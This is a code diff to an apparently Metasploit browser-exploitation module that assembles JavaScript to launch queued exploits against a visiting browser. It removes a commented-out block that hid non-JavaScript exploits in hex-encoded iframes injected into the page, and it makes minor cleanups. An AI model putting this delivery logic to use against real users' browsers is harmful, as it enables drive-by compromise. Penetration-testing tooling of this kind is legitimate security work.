@@ -385,7 +385,6 @@ class Metasploit3 < Msf::Auxiliary
 	def start_exploit_modules()
 		@lhost = (datastore['LHOST'] || "0.0.0.0")
 
-		@js_tests = {}
 		@noscript_tests = {}
 		@all_tests = {}
 
@@ -501,6 +500,7 @@ class Metasploit3 < Msf::Auxiliary
 		# let the handlers get set up
 		Rex::ThreadSafe.sleep(0.5)
 
+		print_line
 		print_status("--- Done, found %bld%grn#{@exploits.length}%clr exploit modules")
 		print_line
 
@@ -807,42 +807,6 @@ class Metasploit3 < Msf::Auxiliary
 				end
 			}
 		}
-
-		# Add a javaEnabled() test specifically for java exploits.  Other
-		# exploits that don't require javascript go into a big pile of iframes
-		# that will be dumped out after other exploitation is done, assuming
-		# the browser didn't stop somewhere along the way due to a successful
-		# exploit or a crash from all the memory raping we just did.
-		#noscript_html = ""
-		#@noscript_tests.each { |browser, sploits|
-		#	sploits.each do |s|
-		#		if s[:name] =~ %r|/java_|
-		#			res = exploit_resource(s[:name]).gsub("\n",'').gsub("'", "\\\\'")
-		#			js << "global_exploit_list[global_exploit_list.length] = {\n"
-		#			js << "  'test':'is_vuln = navigator.javaEnabled()',\n"
-		#			js << "  'resource':'#{res}'\n"
-		#			js << "};\n"
-		#		else
-					# Some other kind of exploit that we can't generically
-					# check for in javascript, throw it on the pile.
-		#			noscript_html << html_for_exploit(s, client_info)
-		#		end
-		#		sploits_for_this_client.push s[:name]
-		#		sploit_cnt += 1
-		#	end
-		#}
-
-		# If all of our exploits that require javascript fail, try to continue
-		# with those that don't
-		#js << %Q|var noscript_exploits = "|
-		#js << Rex::Text.to_hex(noscript_html, "%")
-		#js << %Q|";\n|
-		#js << %Q|var noscript_div = document.createElement("div");\n|
-		# Have to use innerHTML here to render the new iframes. Using
-		# document.createElement and appendChild() will escape all the
-		# entities.
-		#js << %Q|noscript_div.innerHTML = unescape(noscript_exploits);\n|
-		#js << %Q|document.body.appendChild(noscript_div);\n|
 
 		js << "#{js_debug("'starting exploits (' + global_exploit_list.length + ' total)<br>'")}\n"
 		js << "window.next_exploit(0);\n"
